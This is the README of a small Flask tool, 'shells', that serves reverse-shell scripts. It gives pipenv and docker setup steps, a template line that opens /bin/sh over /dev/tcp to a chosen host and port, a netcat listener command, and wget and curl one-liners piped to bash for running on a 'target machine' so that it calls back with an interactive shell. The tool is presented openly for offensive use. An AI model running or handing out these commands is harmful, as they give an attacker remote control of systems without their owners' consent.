# shells
shells, based on [reverse-shell](https://github.com/lukechilds/reverse-shell).

## run
setup python environment
```bash
pipenv install
```

virtual environment and run
```bash
pipenv shell
flask run --port 8080 --host 0.0.0.0
```

or just run this
```
pipenv run flask run --port 8080 --host 0.0.0.0
```

## new command
add new command in `shells.template` specify the $host and $port
```
if command -v sh > /dev/null 2>&1; then 
	/bin/sh -i >& /dev/tcp/$host/$port 0>&1
	exit;
fi
```

# docker
build the image
```
docker build -t shells .
```
run the docker container
```
docker run -p 8000:8000 shells
```
runtime details
```
docker ps
```

# give me a shell
Listen with netcat:
```
nc -lvp 1338
```

run this on target machine:
```
wget -qO- http://mi-ip-host:port/127.0.0.1:1338 | bash

curl http://mi-ip-host:port/127.0.0.1:1338 | bash
```
